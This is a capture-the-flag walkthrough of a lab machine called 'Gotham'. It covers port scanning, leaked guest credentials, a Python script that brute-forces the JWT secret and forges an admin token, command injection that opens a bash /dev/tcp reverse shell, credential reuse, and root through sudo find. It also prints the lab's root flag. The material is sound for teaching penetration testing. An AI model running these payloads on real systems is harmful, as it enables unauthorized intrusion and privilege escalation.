![Screenshot](/easy/Gotham/Images/machine.png)

Difficulty: **Easy**

Made by: **TheBat**

---
# Steps to pwn 🥽:
* 👁️  [Reconnaissance](#reconnaissance)
* 🪓 [Exploitation](#exploitation)
* 🚩 [Privilege Escalation](#privilege-escalation)

---
## 🛠️ Techniques: Bruteforce JWT (Jason Web Token), Command Injection, Reuse of credentials, and finally escalate privileges with sudoer

---

First of all we make sure that the machine is up, we can prove it with the command **ping**

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/facil/gotham/enumeration]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.230 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.138 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.136 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2037ms
rtt min/avg/max/mdev = 0.136/0.168/0.230/0.043 ms
```

Now, we can start our **reconnaissance** phase.

---
# Reconnaissance

To start our reconnaissance phase, we use **nmap** to know what ports are open in the target.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/facil/gotham/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-14 19:42 -0500
Initiating ARP Ping Scan at 19:42
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 19:42, 0.11s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:42
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 19:42, 2.75s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000024s latency).
Scanned at 2026-06-14 19:42:25 -05 for 2s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: CE:BE:22:F4:C0:B6 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.18 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

Once the scan concludes we can see 2 ports open:

- port 22 (ssh / Secure Shell)
- port 80 (http / Hyper Text Transfer Protocol)

To know more about these ports like what services and versions are running on, we can use nmap once again to do this.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/facil/gotham/enumeration]
└─$ nmap -p22,80 -n -Pn -sCV 172.17.0.2 -oX target.xml
```

**-p22,80** <- With this argument nmap will only scan these 2 ports that we discover.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports.

**-oX target.xml** <- With this argument we save all the output that nmap give us and save it as a xml file.

And we can execute **xsltproc** to change a xml file to a html file, so we can execute the following command:

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/facil/gotham/enumeration]
└─$ xsltproc target.xml -o target.html && rm target.xml
```

And after doing this, we can open our browser to see the html file.

And we can see the following image:

![Screenshot](/easy/Gotham/Images/Image1.png)

We can see that exists a website and 2 routes in robots.txt: **/dashboard.php** and **/admin.php**

Let's use **whatweb** to know what technologies uses this website.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/facil/gotham/enumeration]
└─$ whatweb http://172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[172.17.0.2], PasswordField[password], Title[Gotham City Network]
```

Only we can see that uses apache, and nothing else, so let's take a look into the website.

![Screenshot](/easy/Gotham/Images/Image2.png)

We can see a login page, if we look into the source code we can see this:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gotham City Network</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="box">
        <h1>GOTHAM//NET</h1>
        <div class="sub">SECURE ACCESS TERMINAL</div>
        <form method="POST">
            <label>USERNAME</label>
            <input type="text" name="username" autocomplete="off">
            <label>PASSWORD</label>
            <input type="password" name="password">
            <button type="submit">AUTHENTICATE</button>
        </form>
            </div>
    <!-- TODO: remove the temporary guest:guest account before go-live -- W.E. -->
</body>
</html>
```

We can see an commentary in the website, it seems that is credentials to login, so let's use them.

![Screenshot](/easy/Gotham/Images/Image3.png)

As we can see we successfully login, but if we try to visit the admin panel we can't see anything.

After trying SQL Injections or anything possible payload, our last thing to try is the JWT token,

This is our JWT token:

```ruby
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc4MTQ4NzgyNH0.F8hh4bMFGB36ZmhGB9L4Xq6s64I9g629O4xgogD_49k
```

We can try to decode it with jwt.io, and we can see this

![Screenshot](/easy/Gotham/Images/Image4.png)

We can see that this token we login as the user guest and the role as user, we can try to set the algorithm to none  and paste it into the session of our browser, in rare cases if we do this we can login as admin, but if we try it, it doesn't work.

---
# Exploitation

So the last thing to do is getting the secret key with brute force, and try over and over again to get it, and if we get the secret key, we can create another JWT to login as **admin**.

Okay now, i'm going to make a python script to try to get the secret key, and if we got it, we get back another JWT as admin.

```python
from pwn import *
import jwt, signal, warnings

def stop(sig=False, frame=False):
    print()
    warn('QUITTING...')
    exit()

warnings.filterwarnings("ignore")
signal.signal(signal.SIGINT, stop)

rockyou = '/usr/share/wordlists/rockyou.txt'

def generate(key):
    parameters = { 
        "user": "admin",
        "role": "admin",
        "iat": 1781487824
    }

    generated = jwt.encode(parameters, key, algorithm='HS256')
    return generated

def bruteforce():
    bar = log.progress('Bruteforcing')
    token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc4MTQ4NzgyNH0.F8hh4bMFGB36ZmhGB9L4Xq6s64I9g629O4xgogD_49k'

    with open(rockyou, 'r') as file:
        for line in file:
            bar.status(f'Trying with: {line.strip()}')
            try:
                decoded = jwt.decode(token, line.strip(), algorithms=['HS256'])
                info(f'Decoded token: {decoded}')
                bar.success(f'The secret key is: {line.strip()}')
                print()

                info('Creating admin JWT token...')
                generated = generate(line.strip())
                warn(f'The generated admin token is: {generated}')
                stop()
            except Exception: continue

if __name__ == '__main__':
    bruteforce()
```

So if we execute our exploit we can see this:

```python
┌──(craft㉿kali)-[~/…/dockerlabs/facil/gotham/exploits]
└─$ python exploit.py 
[+] Bruteforcing: The secret key is: batman
[*] Decoded token: {'user': 'guest', 'role': 'user', 'iat': 1781487824}

[*] Creating admin JWT token...
[!] The generated admin token is: [REDACTED]

[!] QUITTING...
```

And we can see that the secret key is **batman** and also we get the admin jwt token, so let's paste it into our browser changing our session cookie to this new jwt token.

Okay so now we have admin power and now we can see this in our admin panel:

![Screenshot](/easy/Gotham/Images/Image5.png)

So we can type an IP address and we receive the output, but this output we see it familiar, like the command **ping** in linux, the command that exactly does this is the next one:

```r
ping -c 1 <INPUT>
```

And now, we can try to do a command injection, like something iike this, what happens?

```r
ping -c 1 <INPUT>; id
```

So when we execute this, we are getting the output of ping, then immediately we execute the id command, that returns our user id, group id and so on.

Then let's give it a try with this:

![Screenshot](/easy/Gotham/Images/Image6.png)

So we have successfully injected a command, now let's create a reverse shell.

But before executing that command, we need to be in listen mode with **netcat** to receive the connection of the reverse shell.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/facil/gotham/exploits]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

**-l**  <- This argument makes to netcat to be in listening mode.

**-v** <- This argument activates the **verbose** mode, this will show us in more detail the connection that we receive.

**-n** <- This makes to netcat to skip the DNS lookup, and only uses the IP address directly.

**-p** <- The port we are in listening, can be any, if it's not being currently used.

Okay now let's execute our command injection:

```r
ping -c 1 <INPUT>; bash -c 'bash -i >& /dev/tcp/172.17.0.1/1234 0>&1'
```

**-c** <- We are telling to bash to execute the following command.

**-i** <- We are telling to bash to make an interactive shell.

`>&` <- We are redirecting **stderr** to **stdout**.

**0>&1** <- We are redirecting stdin to **stdout**.

And we receive this:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/facil/gotham/exploits]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 43562
bash: cannot set terminal process group (34): Inappropriate ioctl for device
bash: no job control in this shell
www-data@03f902188a92:/var/www/html$ whoami
whoami
www-data
```

And we are in!

Now let's do a treatment of this ugly terminal.

First of all we do this:

```r
www-data@03f902188a92:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
```

This command makes a new bash session with **script** and **/dev/null** as the output file, because script register every command we execute in a log, but with /dev/null path, we make that log can't record commands, and **-c bash** makes script to run the shell with bash.

We do this because we want to use CTRL + C and more functions of bash.

When we execute this, we suspend our reverse shell for a moment with CTRL + Z.

then we execute the next command in our attack machine:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/facil/gotham/exploits]
└─$ stty raw -echo; fg
```

This command does that stty will treat the terminal.

**raw** <- With raw we are making all the data of output and input to be as raw.

**-echo** <- With this we are making that if we execute a command it will not be printed again in the output.

**; fg** <- And with this we resume our reverse shell again.

When we execute this command we reset the xterm:

```r
reset xterm
```

This are going to reset the terminal.

If we want to clear our terminal we can't because the term it gonna be different of the xterm, that it have this function. We can do this in the next way to be able to clear our screen if it get nasty, adn also get pretty colours to the terminal:

```r
www-data@03f902188a92:/var/www/html$ export TERM=xterm-256color
```

To activate the colours we need to execute the following command:

```r
www-data@03f902188a92:/var/www/html$ source /etc/skel/.bashrc
```

And one last thing, if we notice the display of the terminal is very tiny!

We can adjust this to be more bigger with the next command:

```r
www-data@03f902188a92:/var/www/html$ stty rows {num} columns {num}
```

and finally it looks way better!

---
# Privilege Escalation

In the current directory that we are in, if we list what's inside of the directory with **ls** we can see this:

```r
www-data@03f902188a92:/var/www/html$ ls
admin.php  config.php  dashboard.php  index.php  jwt.php  robots.txt  style.css
```

We can see a interesting file **config.php** if we see the content we can see this:

```r
www-data@03f902188a92:/var/www/html$ cat config.php 
<?php
// config.php — Gotham City Network (internal)
// =============================================
// Legacy DB connection. Migrar a vault pendiente.
$DB_HOST = '127.0.0.1';
$DB_USER = 'gothamdb';
$DB_PASS = '[REDACTED]';   // NOTE(W.E.): misma clave usada en la cuenta de mantenimiento

// Secreto de firma de sesiones (rotar trimestralmente)
$JWT_SECRET = 'batman';

// Cuentas de la aplicación
$USERS = [
    'guest' => ['pass' => 'guest', 'role' => 'user'],
];
?
```

We can see an user and also his password, we can try to use this password to the only user of the system (bruce).

```r
www-data@03f902188a92:/var/www/html$ su bruce
Password: 
bruce@03f902188a92:/var/www/html$ whoami
bruce
```

Now we are the user bruce, let's try to see some sudoer privileges if we have with **sudo -l**

```r
bruce@03f902188a92:/var/www/html$ sudo -l
Matching Defaults entries for bruce on 03f902188a92:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User bruce may run the following commands on 03f902188a92:
    (root) NOPASSWD: /usr/bin/find
```

And we can see that we can execute the command find, as the user **root**

So let's execute the next command to get a shell as the user root:

```r
bruce@03f902188a92:/var/www/html$ sudo find . -exec bash \; -quit
```

So we execute a command bash to get a shell as the user root.

```c
bruce@03f902188a92:/var/www/html$ sudo find . -exec bash \; -quit
root@03f902188a92:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
root@03f902188a92:/var/www/html# cat /root/root.txt 
a7e2c9f81b6d40539e8170264fbac3d5
```

Great we are root now ***...pwned..!***
